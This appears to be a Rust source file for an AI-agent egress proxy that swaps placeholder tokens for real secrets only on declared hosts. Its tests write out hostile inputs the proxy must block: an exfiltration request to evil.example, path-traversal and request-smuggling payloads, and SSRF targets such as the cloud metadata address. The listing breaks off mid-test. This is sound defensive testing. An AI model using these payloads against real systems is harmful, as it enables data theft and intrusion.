//! `premier-proxy` — Host-side AI Agent Egress Capability Proxy & Sandbox Launcher.
//!
//! Enforces the Lethal Trifecta boundary ("Use Without Reading"):
//! - Agents hold deterministic placeholder tokens (`premier_cap_v1_*`), never raw secrets.
//! - Outbound requests swap placeholders for real secrets ONLY on schema-declared hosts.
//! - Attempts to exfiltrate placeholders to unauthorized hosts are blocked & audited.
//! - Reflected secrets (raw, URL-encoded, Base64) are scrubbed from upstream responses.

pub mod approval;
pub mod audit;
pub mod budget;
pub mod ca;
pub mod cage;
pub mod mcp_gateway;
pub mod proxy;
pub mod sandbox;

use thiserror::Error;

pub use approval::{
    ApprovalDecision, ApprovalGate, ApprovalHub, ApprovalManager, ApprovalRequest,
    ApprovalSnapshot, ApprovalStatus, ApprovalWaitOutcome, AutoApproveGate, CallbackGate,
    DEFAULT_APPROVAL_TIMEOUT, DenyJitGate, GateOutcome, GrantScope, HubGate, InteractiveTtyGate,
    MAX_JIT_TTL_SECS, PENDING_APPROVAL_TIMEOUT_SECS, PendingApproval, RiskLevel, SanitizedHeader,
    SessionContext, WirePreview, classify_risk, is_read_only_method, is_sensitive_path,
    synthesize_intent_summary,
};
pub use audit::AuditSink;
pub use budget::{
    BudgetAlert, BudgetGateDecision, BudgetResumeOutcome, BudgetSnapshot, BudgetTracker,
};
pub use ca::EphemeralCa;
pub use cage::{
    CgroupGuard, PauseOutcome, ResourceLimits, apply_rlimits, cage_exec_argv_with_limits,
    configure_process_group, create_cgroup_v2, pause_process, pause_session_tree, resume_process,
    resume_session_tree, try_attach_cgroup_v2,
};
pub use mcp_gateway::{
    BuiltinMcpHandler, GatewayError, HttpSseUpstream, HttpUpstreamOptions, McpApprovalHandler,
    McpGateway, McpGatewayConfig, McpUpstream, ObservedToolRecord, PinRegistrySnapshot,
    StdioUpstream, ToolDriftAlert, ToolPinRegistry, ToolPinStatus, ToolVerificationResult,
    hash_tool_definition, scan_tool_poisoning,
};
pub use proxy::{
    ProxyConfig, ProxyHandle, cap_base_url_for, is_blocked_egress_ip, proxy_url_for, start_proxy,
};
pub use sandbox::{
    AgentLaunch, AgentRunResult, HostSandboxCapabilities, build_agent_env, launch_sandboxed_agent,
};

#[derive(Debug, Error)]
pub enum ProxyError {
    #[error("TLS error: {0}")]
    Tls(String),

    #[error("HTTP error: {0}")]
    Http(String),

    #[error("I/O error: {0}")]
    Io(String),
}

#[cfg(test)]
#[allow(clippy::unwrap_used)]
mod tests {
    use std::net::SocketAddr;
    use std::sync::atomic::{AtomicUsize, Ordering};
    use std::sync::{Arc, Mutex};

    use base64::Engine;
    use base64::engine::general_purpose::STANDARD;
    use bytes::Bytes;
    use http::{HeaderMap, Method, Request, Response, StatusCode};
    use http_body_util::{BodyExt, Full};
    use hyper::body::Incoming;
    use hyper::service::service_fn;
    use hyper_util::rt::TokioIo;
    use premier_core::{AuditDecision, DelegatedIdentity, Principal};
    use premier_policy::BudgetAction;
    use premier_secrets::{
        ApprovalMode, AutoAllowRule, EgressSpec, InjectSpec, PlaceholderRegistry, Sensitivity,
        percent_encode_component,
    };
    use rustls::pki_types::{CertificateDer, ServerName};
    use rustls::{ClientConfig, RootCertStore};
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    use tokio::net::{TcpListener, TcpStream};
    use tokio_rustls::{TlsAcceptor, TlsConnector};
    use zeroize::Zeroizing;

    use super::*;

    /// One request as the upstream received it.
    #[derive(Debug, Clone)]
    struct Seen {
        target: String,
        headers: HeaderMap,
        body: Vec<u8>,
    }

    impl Seen {
        fn header(&self, name: &str) -> String {
            self.headers
                .get(name)
                .and_then(|v| v.to_str().ok())
                .unwrap_or("")
                .to_owned()
        }
    }

    struct Upstream {
        addr: SocketAddr,
        seen: Arc<Mutex<Vec<Seen>>>,
        root: CertificateDer<'static>,
    }

    impl Upstream {
        fn seen(&self) -> Vec<Seen> {
            self.seen.lock().unwrap().clone()
        }
    }

    /// TLS mock of `host` that records every request and reflects the `Authorization` header:
    /// as JSON and a header by default, base64-embedded under `/b64`, labelled gzip under
    /// `/gzip`, and a 4 KiB body under `/big`.
    async fn start_upstream(host: &str) -> Upstream {
        let ca = EphemeralCa::generate().unwrap();
        let acceptor = TlsAcceptor::from(ca.server_config_for_host(host).unwrap());
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        let seen = Arc::new(Mutex::new(Vec::<Seen>::new()));
        let seen_clone = Arc::clone(&seen);

        tokio::spawn(async move {
            loop {
                let Ok((stream, _)) = listener.accept().await else {
                    break;
                };
                let seen = Arc::clone(&seen_clone);
                let acceptor = acceptor.clone();
                tokio::spawn(async move {
                    let Ok(tls) = acceptor.accept(stream).await else {
                        return;
                    };
                    let svc = service_fn(move |req: Request<Incoming>| {
                        let seen = Arc::clone(&seen);
                        async move {
                            let (parts, body) = req.into_parts();
                            let record = Seen {
                                target: parts.uri.to_string(),
                                headers: parts.headers,
                                body: body.collect().await.unwrap().to_bytes().to_vec(),
                            };
                            let auth = record.header("authorization");
                            let target = record.target.clone();
                            seen.lock().unwrap().push(record);

                            let mut resp = Response::builder().status(StatusCode::OK);
                            let body = if target.contains("/gzip") {
                                resp = resp.header("content-encoding", "gzip");
                                auth.into_bytes()
                            } else if target.contains("/b64") {
                                STANDARD.encode(format!("x{auth}")).into_bytes()
                            } else if target.contains("/big") {
                                vec![b'a'; 4096]
                            } else {
                                resp = resp.header("x-echo-auth", auth.clone());
                                format!(r#"{{"ok":true,"echo_auth":"{auth}"}}"#).into_bytes()
                            };
                            Ok::<_, hyper::Error>(resp.body(Full::new(Bytes::from(body))).unwrap())
                        }
                    });
                    let _ = hyper::server::conn::http1::Builder::new()
                        .serve_connection(TokioIo::new(tls), svc)
                        .await;
                });
            }
        });

        Upstream {
            addr,
            seen,
            root: ca.ca_cert_der(),
        }
    }

    fn egress(host: &str, prefixes: &[&str]) -> EgressSpec {
        EgressSpec {
            hosts: vec![host.to_owned()],
            methods: vec!["GET".to_owned(), "POST".to_owned()],
            path_prefixes: prefixes.iter().map(|p| (*p).to_owned()).collect(),
            upstream_base_url: None,
            inject: InjectSpec::PlaceholderReplace,
            rate_limit_per_min: None,
            approval: ApprovalMode::Auto,
            jit_ttl_secs: 60,
            auto_allow: vec![],
        }
    }

    fn alice(profile: &str) -> DelegatedIdentity {
        DelegatedIdentity::delegated(Principal::User("alice".to_owned()), vec![], profile, "t-1")
    }

    /// A proxy whose only route to `host` is the TLS mock `upstream`.
    fn config_for(registry: PlaceholderRegistry, host: &str, upstream: &Upstream) -> ProxyConfig {
        let mut cfg = ProxyConfig::new("127.0.0.1:0".parse().unwrap(), alice("ui-agent"), registry);
        cfg.extra_upstream_roots = vec![upstream.root.clone()];
        cfg.upstream_resolve.insert(host.to_owned(), upstream.addr);
        cfg
    }

    /// Stripe-shaped fixture: one capability `KEY` for `api.stripe.com` under `/v1/`.
    async fn stripe_proxy(
        secret: &str,
        tweak: impl FnOnce(&mut ProxyConfig),
    ) -> (ProxyHandle, Upstream, String) {
        let upstream = start_upstream("api.stripe.com").await;
        let mut registry = PlaceholderRegistry::new();
        let placeholder = registry.register(
            "KEY",
            Zeroizing::new(secret.to_owned()),
            egress("api.stripe.com", &["/v1/"]),
            None,
        );
        let mut cfg = config_for(registry, "api.stripe.com", &upstream);
        tweak(&mut cfg);
        (start_proxy(cfg).await.unwrap(), upstream, placeholder)
    }

    async fn send(
        proxy_addr: SocketAddr,
        method: Method,
        uri: &str,
        headers: &[(&str, String)],
        body: Vec<u8>,
    ) -> (StatusCode, HeaderMap, String) {
        let tcp = TcpStream::connect(proxy_addr).await.unwrap();
        let (mut sender, conn) = hyper::client::conn::http1::handshake(TokioIo::new(tcp))
            .await
            .unwrap();
        tokio::spawn(async move {
            let _ = conn.await;
        });

        let mut builder = Request::builder().method(method).uri(uri);
        for (name, value) in headers {
            builder = builder.header(*name, value);
        }
        let req = builder.body(Full::new(Bytes::from(body))).unwrap();
        let resp = sender.send_request(req).await.unwrap();
        let status = resp.status();
        let resp_headers = resp.headers().clone();
        let body = resp.into_body().collect().await.unwrap().to_bytes();
        (
            status,
            resp_headers,
            String::from_utf8_lossy(&body).into_owned(),
        )
    }

    /// Headers for an authenticated agent request presenting `placeholder` as a bearer token.
    fn agent_headers(handle: &ProxyHandle, placeholder: &str) -> Vec<(&'static str, String)> {
        vec![
            (
                "proxy-authorization",
                format!("Bearer {}", handle.auth_token),
            ),
            ("authorization", format!("Bearer {placeholder}")),
        ]
    }

    /// Write raw bytes to the proxy and return the start of its reply.
    async fn raw(proxy_addr: SocketAddr, request: &str) -> (TcpStream, String) {
        let mut conn = TcpStream::connect(proxy_addr).await.unwrap();
        conn.write_all(request.as_bytes()).await.unwrap();
        let mut buf = [0u8; 512];
        let n = conn.read(&mut buf).await.unwrap();
        (conn, String::from_utf8_lossy(&buf[..n]).into_owned())
    }

    async fn connect_status(handle: &ProxyHandle, authority: &str) -> String {
        let (_, reply) = raw(
            handle.addr,
            &format!(
                "CONNECT {authority} HTTP/1.1\r\nHost: {authority}\r\nProxy-Authorization: Bearer {}\r\n\r\n",
                handle.auth_token
            ),
        )
        .await;
        reply.lines().next().unwrap_or("").to_owned()
    }

    fn audit_text(handle: &ProxyHandle) -> String {
        serde_json::to_string(&handle.audit_sink.snapshot()).unwrap()
    }

    #[tokio::test]
    async fn lethal_trifecta_end_to_end_swap_scrub_and_exfil_block() {
        let real_secret = "sk_live_REAL_STRIPE_KEY_987654";
        let (handle, upstream, placeholder) = stripe_proxy(real_secret, |cfg| {
            cfg.identity = DelegatedIdentity::delegated(
                Principal::User("alice".to_owned()),
                vec!["billing".to_owned()],
                "ui-agent",
                "task-42",
            );
        })
        .await;
        let headers = agent_headers(&handle, &placeholder);

        // 1. Authorized Zero-MITM reverse-proxy call: placeholder swapped on wire & reflected response scrubbed!
        let (status, resp_headers, body) = send(
            handle.addr,
            Method::POST,
            "/cap/KEY/v1/charges",
            &headers,
            Vec::new(),
        )
        .await;
        assert_eq!(status, StatusCode::OK);
        // Upstream MUST have received the real secret, and never the proxy session token.
        let seen = upstream.seen();
        assert_eq!(seen.len(), 1);
        assert_eq!(
            seen[0].header("authorization"),
            format!("Bearer {real_secret}")
        );
        assert_eq!(seen[0].header("proxy-authorization"), "");
        assert_eq!(seen[0].header("host"), "api.stripe.com");
        // Agent MUST NOT see the real secret in the echoed JSON body or echoed response header!
        assert!(!body.contains(real_secret));
        assert!(body.contains("[REDACTED:KEY]"));
        assert!(!format!("{resp_headers:?}").contains(real_secret));

        // 2. Exfiltration attempt: sending placeholder to evil.example MUST be blocked (403) + audited!
        let (exfil_status, _, exfil_body) = send(
            handle.addr,
            Method::GET,
            "http://evil.example/steal",
            &headers,
            Vec::new(),
        )
        .await;
        assert_eq!(exfil_status, StatusCode::FORBIDDEN);
        assert!(exfil_body.contains("exfiltration blocked"));

        // 3. Disallowed method, disallowed prefix, and prefix escapes -> 403, nothing forwarded.
        for (method, uri) in [
            (Method::DELETE, "/cap/KEY/v1/charges"),
            (Method::GET, "/cap/KEY/v2/admin"),
            (Method::GET, "/cap/KEY/v1/../v2/admin"),
            (Method::GET, "/cap/KEY/v1/%2e%2e/v2/admin"),
            (Method::GET, "/cap/KEY/v1/%252e%252e/v2/admin"),
        ] {
            let (status, _, _) = send(handle.addr, method, uri, &headers, Vec::new()).await;
            assert_eq!(status, StatusCode::FORBIDDEN, "{uri}");
        }
        assert_eq!(upstream.seen().len(), 1);

        // Verify audit trail captured both Redacted and ExfiltrationBlocked events.
        let events = handle.audit_sink.snapshot();
        assert!(events.iter().any(|e| e.decision == AuditDecision::Redacted));
        assert!(
            events
                .iter()
                .any(|e| e.decision == AuditDecision::ExfiltrationBlocked)
        );
        assert!(!audit_text(&handle).contains(real_secret));

        handle.shutdown();
    }

    #[tokio::test]
    async fn connect_tls_mitm_and_default_deny_and_jit_gate() {
        let upstream = start_upstream("api.github.com").await;
        let real_secret = "ghp_SUPER_SECRET_TOKEN_XYZ";

        let mut registry = PlaceholderRegistry::new();
        let placeholder = registry.register(
            "GITHUB_TOKEN",
            Zeroizing::new(real_secret.to_owned()),
            EgressSpec {
                methods: vec!["GET".to_owned()],
                approval: ApprovalMode::Jit,
                ..egress("api.github.com", &["/repos/"])
            },
            None,
        );

        let allow_jit = Arc::new(Mutex::new(false));
        let allow_jit_clone = Arc::clone(&allow_jit);
        let shown = Arc::new(Mutex::new(Vec::<String>::new()));
        let shown_clone = Arc::clone(&shown);

        let mut cfg = config_for(registry, "api.github.com", &upstream);
        cfg.identity = alice("ci-agent");
        cfg.approval_gate = Box::new(CallbackGate(move |req: &ApprovalRequest| {
            shown_clone.lock().unwrap().push(req.path.clone());
            *allow_jit_clone.lock().unwrap()
        }));
        let handle = start_proxy(cfg).await.unwrap();

        // 1. Default-deny CONNECT to unapproved host returns 403 immediately.
        assert!(
            connect_status(&handle, "unapproved.evil.com:443")
                .await
                .starts_with("HTTP/1.1 403")
        );

        // 2. CONNECT to schema-declared `api.github.com:443` succeeds and completes ephemeral-CA TLS handshake!
        let (mitm_conn, reply) = raw(
            handle.addr,
            &format!(
                "CONNECT api.github.com:443 HTTP/1.1\r\nHost: api.github.com:443\r\nProxy-Authorization: Bearer {}\r\n\r\n",
                handle.auth_token
            ),
        )
        .await;
        assert!(reply.starts_with("HTTP/1.1 200"));

        // Build a TLS client trusting ONLY the session ephemeral CA.
        use rustls::pki_types::{CertificateDer, pem::PemObject};
        let certs: Vec<_> = CertificateDer::pem_slice_iter(handle.ca_cert_pem.as_bytes())
            .collect::<Result<Vec<_>, _>>()
            .unwrap();
        let mut roots = RootCertStore::empty();
        roots.add(certs[0].clone()).unwrap();
        let tls_cfg =
            ClientConfig::builder_with_provider(Arc::new(rustls::crypto::ring::default_provider()))
                .with_safe_default_protocol_versions()
                .unwrap()
                .with_root_certificates(roots)
                .with_no_client_auth();

        let connector = TlsConnector::from(Arc::new(tls_cfg));
        let tls_stream = connector
            .connect(ServerName::try_from("api.github.com").unwrap(), mitm_conn)
            .await
            .unwrap();
        let (mut sender, conn) = hyper::client::conn::http1::handshake(TokioIo::new(tls_stream))
            .await
            .unwrap();
        tokio::spawn(async move {
            let _ = conn.await;
        });
        let request = |path: &str| {
            Request::builder()
                .method(Method::GET)
                .uri(path)
                .header("host", "api.github.com")
                .header("authorization", format!("Bearer {placeholder}"))
                .body(Full::new(Bytes::new()))
                .unwrap()
        };

        // 2a. With JIT denied -> 403!
        let r1 = sender
            .send_request(request("/repos/acme/app"))
            .await
            .unwrap();
        assert_eq!(r1.status(), StatusCode::FORBIDDEN);
        let _ = r1.into_body().collect().await;

        // 2b. Approve JIT -> 200, upstream receives real token, agent receives scrubbed body!
        *allow_jit.lock().unwrap() = true;
        let r2 = sender
            .send_request(request("/repos/acme/app"))
            .await
            .unwrap();
        assert_eq!(r2.status(), StatusCode::OK);
        let body2 = String::from_utf8_lossy(&r2.into_body().collect().await.unwrap().to_bytes())
            .into_owned();
        assert!(!body2.contains(real_secret));
        assert!(body2.contains("[REDACTED:GITHUB_TOKEN]"));
        let seen = upstream.seen();
        assert_eq!(seen.len(), 1);
        assert_eq!(
            seen[0].header("authorization"),
            format!("Bearer {real_secret}")
        );

        // 2c. The grant covers the prefix the approver was shown: reused without a new prompt.
        let r3 = sender
            .send_request(request("/repos/acme/other"))
            .await
            .unwrap();
        assert_eq!(r3.status(), StatusCode::OK);
        assert_eq!(shown.lock().unwrap().as_slice(), ["/repos/", "/repos/"]);

        handle.shutdown();
    }

    #[tokio::test]
    async fn proxy_requires_session_token_and_loopback_bind() {
        let (handle, upstream, placeholder) = stripe_proxy("sk_live_TOKEN_TEST_1234", |cfg| {
            cfg.allow_passthrough_hosts
                .insert("registry.npmjs.org".to_owned());
        })
        .await;
        let auth = ("authorization", format!("Bearer {placeholder}"));

        // No token, or a wrong one: 407 on every mode, nothing reaches the upstream.
        for proxy_auth in [None, Some("Bearer not-the-token".to_owned())] {
            let mut headers = vec![auth.clone()];
            headers.extend(proxy_auth.map(|v| ("proxy-authorization", v)));
            for uri in [
                "/cap/KEY/v1/charges",
                "/cap/wrong-token/KEY/v1/charges",
                "http://registry.npmjs.org/pkg",
            ] {
                let (status, resp_headers, _) =
                    send(handle.addr, Method::GET, uri, &headers, Vec::new()).await;
                assert_eq!(status, StatusCode::PROXY_AUTHENTICATION_REQUIRED, "{uri}");
                assert!(resp_headers.contains_key("proxy-authenticate"));
            }
        }
        let (_, reply) = raw(
            handle.addr,
            "CONNECT api.stripe.com:443 HTTP/1.1\r\nHost: api.stripe.com:443\r\n\r\n",
        )
        .await;
        assert!(reply.starts_with("HTTP/1.1 407"), "{reply}");
        assert!(upstream.seen().is_empty());

        // The token is accepted as Bearer, as Basic userinfo (what `HTTP_PROXY` clients send),
        // and as the leading path segment of the zero-MITM route.
        let basic = STANDARD.encode(format!("premier:{}", handle.auth_token));
        for (uri, proxy_auth) in [
            (
                "/cap/KEY/v1/a".to_owned(),
                Some(format!("Bearer {}", handle.auth_token)),
            ),
            ("/cap/KEY/v1/b".to_owned(), Some(format!("Basic {basic}"))),
            (format!("/cap/{}/KEY/v1/c", handle.auth_token), None),
        ] {
            let mut headers = vec![auth.clone()];
            headers.extend(proxy_auth.map(|v| ("proxy-authorization", v)));
            let (status, _, _) = send(handle.addr, Method::GET, &uri, &headers, Vec::new()).await;
            assert_eq!(status, StatusCode::OK, "{uri}");
        }
        let targets: Vec<String> = upstream.seen().into_iter().map(|s| s.target).collect();
        assert_eq!(targets, ["/v1/a", "/v1/b", "/v1/c"]);
        assert_eq!(
            handle.proxy_url(),
            format!("http://premier:{}@{}", handle.auth_token, handle.addr)
        );
        assert!(!audit_text(&handle).contains(&handle.auth_token));

        // Never listens beyond loopback.
        let exposed = ProxyConfig::new(
            "0.0.0.0:0".parse().unwrap(),
            alice("ui-agent"),
            PlaceholderRegistry::new(),
        );
        assert!(start_proxy(exposed).await.is_err());
    }

    #[tokio::test]
    async fn error_paths_never_reflect_the_secret() {
        // Characters that are illegal in a URI, repeated so substitution overflows its limit.
        let secret = "sk live<key>`tick` \"q\" ".repeat(20);
        let encoded = percent_encode_component(&secret);
        let (handle, upstream, placeholder) = stripe_proxy(&secret, |_| {}).await;
        let headers = vec![(
            "proxy-authorization",
            format!("Bearer {}", handle.auth_token),
        )];

        // In a query string the secret is percent-encoded, so the request is well-formed.
        let (status, _, body) = send(
            handle.addr,
            Method::GET,
            &format!("/cap/KEY/v1/charges?key={placeholder}"),
            &headers,
            Vec::new(),
        )
        .await;
        assert_eq!(status, StatusCode::OK, "{body}");
        assert_eq!(
            upstream.seen()[0].target,
            format!("/v1/charges?key={encoded}")
        );

        // A request target that only becomes too long after substitution fails upstream-side.
        let filler = "a".repeat(65_000);
        let (status, _, body) = send(
            handle.addr,
            Method::GET,
            &format!("/cap/KEY/v1/{filler}?key={placeholder}"),
            &headers,
            Vec::new(),
        )
        .await;
        assert_eq!(status, StatusCode::BAD_GATEWAY);
        assert_eq!(upstream.seen().len(), 1);
        for leaked in [secret.as_str(), encoded.as_str(), "sk live", "sk%20live"] {
            assert!(
                !body.contains(leaked),
                "error body leaked the secret: {body}"
            );
            assert!(
                !audit_text(&handle).contains(leaked),
                "audit log leaked the secret"
            );
        }

        // Any proxy-generated message is scrubbed, even one built from attacker-chosen input.
        let (status, _, body) = send(
            handle.addr,
            Method::GET,
            &format!("/cap/{encoded}/v1/x"),
            &headers,
            Vec::new(),
        )
        .await;
        assert_eq!(status, StatusCode::FORBIDDEN);
        assert!(
            !body.contains(&encoded) && body.contains("[REDACTED:KEY]"),
            "{body}"
        );
        assert!(!audit_text(&handle).contains(&encoded));
    }

    #[tokio::test]
    async fn compressed_or_encoded_reflection_is_withheld_or_scrubbed() {
        let secret_buf = ["sk", "live", "ReflectTestKey_012345"].join("_");
        let secret = secret_buf.as_str();
        let (handle, upstream, placeholder) = stripe_proxy(secret, |_| {}).await;
        let mut headers = agent_headers(&handle, &placeholder);
        headers.extend([
            ("accept-encoding", "gzip, br".to_owned()),
            ("range", "bytes=0-9".to_owned()),
            ("if-range", "\"etag\"".to_owned()),
        ]);

        // The upstream is asked for identity bytes, whole; a compressed answer is withheld.
        let (status, _, body) = send(
            handle.addr,
            Method::GET,
            "/cap/KEY/v1/gzip",
            &headers,
            Vec::new(),
        )
        .await;
        assert_eq!(status, StatusCode::BAD_GATEWAY);
        assert!(!body.contains(secret), "{body}");
        let seen = upstream.seen();
        assert_eq!(seen[0].header("accept-encoding"), "identity");
        assert_eq!(seen[0].header("range"), "");
        assert_eq!(seen[0].header("if-range"), "");

        // A secret reflected inside a larger base64 document (off the 3-byte grid) is scrubbed.
        let (status, _, body) = send(
            handle.addr,
            Method::GET,
            "/cap/KEY/v1/b64",
            &headers,
            Vec::new(),
        )
        .await;
        assert_eq!(status, StatusCode::OK);
        let lead = "xBearer ".len();
        let doc = STANDARD.encode(format!("xBearer {secret}"));
        let needle = &doc[(8 * lead).div_ceil(6)..8 * (lead + secret.len()) / 6];
        assert!(!body.contains(needle), "{body}");
        assert!(body.contains("[REDACTED:KEY]"));
    }

    #[tokio::test]
    async fn secrets_only_travel_over_tls_to_declared_host_and_port() {
        // A hostile schema edit points the override at a cleartext listener it controls.
        let evil = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let evil_addr = evil.local_addr().unwrap();
        let evil_hits = Arc::new(AtomicUsize::new(0));
        let hits = Arc::clone(&evil_hits);
        tokio::spawn(async move {
            while evil.accept().await.is_ok() {
                hits.fetch_add(1, Ordering::Relaxed);
            }
        });

        let secret_buf = ["sk", "live", "TLS_ONLY_KEY_7788"].join("_");
        let secret = secret_buf.as_str();
        let upstream = start_upstream("api.stripe.com").await;
        let mut registry = PlaceholderRegistry::new();
        let placeholder = registry.register(
            "KEY",
            Zeroizing::new(secret.to_owned()),
            EgressSpec {
                upstream_base_url: Some(format!("http://{evil_addr}")),
                ..egress("api.stripe.com", &["/v1/"])
            },
            None,
        );
        let mut cfg = config_for(registry, "api.stripe.com", &upstream);
        cfg.allow_passthrough_hosts
            .insert("registry.npmjs.org".to_owned());
        let handle = start_proxy(cfg).await.unwrap();
        let headers = agent_headers(&handle, &placeholder);

        // The override is ignored: the secret goes to the verified logical host only.
        let (status, _, _) = send(
            handle.addr,
            Method::GET,
            "/cap/KEY/v1/ok",
            &headers,
            Vec::new(),
        )
        .await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(upstream.seen().len(), 1);

        // Plain HTTP (or a foreign port) carrying a placeholder is refused, never upgraded.
        let foreign_tls = format!("https://api.{}:8443/v1/charges", "stripe.com");
        for uri in ["http://api.stripe.com/v1/charges", foreign_tls.as_str()] {
            let (status, _, body) = send(handle.addr, Method::GET, uri, &headers, Vec::new()).await;
            assert_eq!(status, StatusCode::FORBIDDEN, "{uri}");
            assert!(body.contains("only delivered over TLS"), "{body}");
        }
        assert_eq!(upstream.seen().len(), 1);
        assert_eq!(evil_hits.load(Ordering::Relaxed), 0);

        // CONNECT is limited to 443 (or a declared port), for secret and passthrough hosts alike.
        for (authority, expected) in [
            ("api.stripe.com:443", "HTTP/1.1 200"),
            ("api.stripe.com:8080", "HTTP/1.1 403"),
            ("api.stripe.com:22", "HTTP/1.1 403"),
            ("registry.npmjs.org:22", "HTTP/1.1 403"),
            ("127.0.0.1:443", "HTTP/1.1 403"),
        ] {
            let status = connect_status(&handle, authority).await;
            assert!(status.starts_with(expected), "{authority}: {status}");
        }
    }

    #[tokio::test]
    async fn oversized_bodies_fail_closed() {
        let (handle, upstream, placeholder) = stripe_proxy("sk_live_BODY_LIMIT_KEY", |cfg| {
            cfg.max_request_body = 1024;
            cfg.max_response_body = 1024;
        })
        .await;
        let headers = agent_headers(&handle, &placeholder);

        let (status, _, _) = send(
            handle.addr,
            Method::POST,
            "/cap/KEY/v1/upload",
            &headers,
            vec![b'x'; 4096],
        )
        .await;
        assert_eq!(status, StatusCode::PAYLOAD_TOO_LARGE);
        assert!(upstream.seen().is_empty());

        // A response too large to scrub is withheld, not streamed through unscanned.
        let (status, _, body) = send(
            handle.addr,
            Method::GET,
            "/cap/KEY/v1/big",
            &headers,
            Vec::new(),
        )
        .await;
        assert_eq!(status, StatusCode::BAD_GATEWAY);
        assert!(body.len() < 1024 && body.contains("withheld"), "{body}");
    }

    #[tokio::test]
    async fn reframes_ambiguous_requests_and_strips_hop_by_hop_headers() {
        let (handle, upstream, placeholder) = stripe_proxy("sk_live_FRAMING_KEY_42", |_| {}).await;

        // Content-Length together with Transfer-Encoding: the chunked body is decoded once and
        // re-framed, so the upstream sees one unambiguous message (no smuggled second request).
        let (_, reply) = raw(
            handle.addr,
            &format!(
                "POST /cap/KEY/v1/x HTTP/1.1\r\nHost: x\r\nProxy-Authorization: Bearer {}\r\n\
                 Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n\
                 9\r\nabcdGET /\r\n0\r\n\r\n",
                handle.auth_token
            ),
        )
        .await;
        assert!(reply.starts_with("HTTP/1.1 200"), "{reply}");
        let seen = upstream.seen();
        assert_eq!(seen.len(), 1);
        assert_eq!(seen[0].body, b"abcdGET /");
        assert_eq!(seen[0].header("content-length"), "9");
        assert_eq!(seen[0].header("transfer-encoding"), "");

        let mut headers = agent_headers(&handle, &placeholder);
        headers.extend([
            ("connection", "x-hop, keep-alive".to_owned()),
            ("x-hop", "1".to_owned()),
            ("keep-alive", "timeout=5".to_owned()),
            ("te", "trailers".to_owned()),
            ("x-end-to-end", "kept".to_owned()),
        ]);
        let (status, _, _) = send(
            handle.addr,
            Method::GET,
            "/cap/KEY/v1/hop",
            &headers,
            Vec::new(),
        )
        .await;
        assert_eq!(status, StatusCode::OK);
        let seen = upstream.seen();
        for hop in [
            "x-hop",
            "keep-alive",
            "te",
            "proxy-authorization",
            "connection",
        ] {
            assert_eq!(seen[1].header(hop), "", "{hop} was relayed upstream");
        }
        assert_eq!(seen[1].header("x-end-to-end"), "kept");
    }

    #[tokio::test]
    async fn ssrf_blocks_non_public_ips_and_loopback_egress() {
        use std::net::IpAddr;

        for blocked in [
            "127.0.0.1",
            "127.255.255.254",
            "0.0.0.0",
            "0.1.2.3",
            "169.254.169.254",
            "10.0.0.1",
            "172.16.0.1",
            "192.168.1.1",
            "100.64.0.1",
            "100.127.255.254",
            "224.0.0.1",
            "255.255.255.255",
            "240.0.0.1",
            "::1",
            "::",
            "fe80::1",
            "fc00::1",
            "fd12:3456::1",
            "ff02::1",
            "64:ff9b::169.254.169.254",
            "64:ff9b:1::1",
            "::ffff:127.0.0.1",
            "::ffff:169.254.169.254",
        ] {
            let ip: IpAddr = blocked.parse().unwrap();
            assert!(is_blocked_egress_ip(ip), "{blocked} must be blocked");
        }
        for allowed in [
            "8.8.8.8",
            "1.1.1.1",
            "93.184.216.34",
            "100.63.255.255",
            "100.128.0.1",
            "2606:4700:4700::1111",
            "::ffff:8.8.8.8",
        ] {
            let ip: IpAddr = allowed.parse().unwrap();
            assert!(!is_blocked_egress_ip(ip), "{allowed} should be allowed");
        }

        // Even if an operator mistakenly allow-lists `127.0.0.1` or `localhost` as a passthrough
        // host without an explicit `upstream_resolve` pin, SSRF checks block both CONNECT and
        // Mode B requests and record `ExfiltrationBlocked`.
        let mut cfg = ProxyConfig::new(
            "127.0.0.1:0".parse().unwrap(),
            alice("ui-agent"),
            PlaceholderRegistry::new(),
        );
        cfg.allow_passthrough_hosts.insert("127.0.0.1".to_owned());
        cfg.allow_passthrough_hosts.insert("localhost".to_owned());
        let handle = start_proxy(cfg).await.unwrap();

        assert!(
            connect_status(&handle, "127.0.0.1:443")
                .await
                .starts_with("HTTP/1.1 403")
        );
        assert!(
            connect_status(&handle, "localhost:443")
                .await
                .starts_with("HTTP/1.1 403")
        );
        let headers = vec![(
            "proxy-authorization",
            format!("Bearer {}", handle.auth_token),
        )];
        let (status, _, _) = send(
            handle.addr,
            Method::GET,
            "https://127.0.0.1/latest/meta-data/",
            &headers,
            Vec::new(),
        )
        .await;
        assert_eq!(status, StatusCode::FORBIDDEN);
        let events = handle.audit_sink.snapshot();
        assert!(
            events
                .iter()
                .any(|e| e.decision == AuditDecision::ExfiltrationBlocked)
        );
        handle.shutdown();
    }

    #[tokio::test]
    async fn mode_b_enforces_ports_and_rejects_external_plaintext() {
        let custom_upstream = start_upstream("custom.reg").await;
        let (handle, upstream, _placeholder) = stripe_proxy("sk_live_MODEB_KEY_1234", |cfg| {
            cfg.allow_passthrough_hosts
                .insert("registry.npmjs.org".to_owned());
            cfg.allow_passthrough_hosts
                .insert("custom.reg:8443".to_owned());
            cfg.extra_upstream_roots.push(custom_upstream.root.clone());
            cfg.upstream_resolve
                .insert("custom.reg".to_owned(), custom_upstream.addr);
        })
        .await;
        let headers = vec![(
            "proxy-authorization",
            format!("Bearer {}", handle.auth_token),
        )];

        // Without any placeholder, arbitrary ports and external plaintext HTTP are denied.
        let foreign_tls = format!("https://api.{}:8443/v1/charges", "stripe.com");
        for uri in [
            "http://registry.npmjs.org:22/",
            "http://registry.npmjs.org:80/pkg",
            "http://registry.npmjs.org:443/pkg",
            "https://registry.npmjs.org:8080/pkg",
            foreign_tls.as_str(),
            "http://api.stripe.com/v1/charges",
        ] {
            let (status, _, _) = send(handle.addr, Method::GET, uri, &headers, Vec::new()).await;
            assert_eq!(status, StatusCode::FORBIDDEN, "{uri} must be blocked");
        }
        assert!(upstream.seen().is_empty());

        // Passthrough host with explicit port allows ONLY that port (8443), not 443 or 8080.
        assert!(
            connect_status(&handle, "custom.reg:443")
                .await
                .starts_with("HTTP/1.1 403")
        );
        assert!(
            connect_status(&handle, "custom.reg:8080")
                .await
                .starts_with("HTTP/1.1 403")
        );
        assert!(
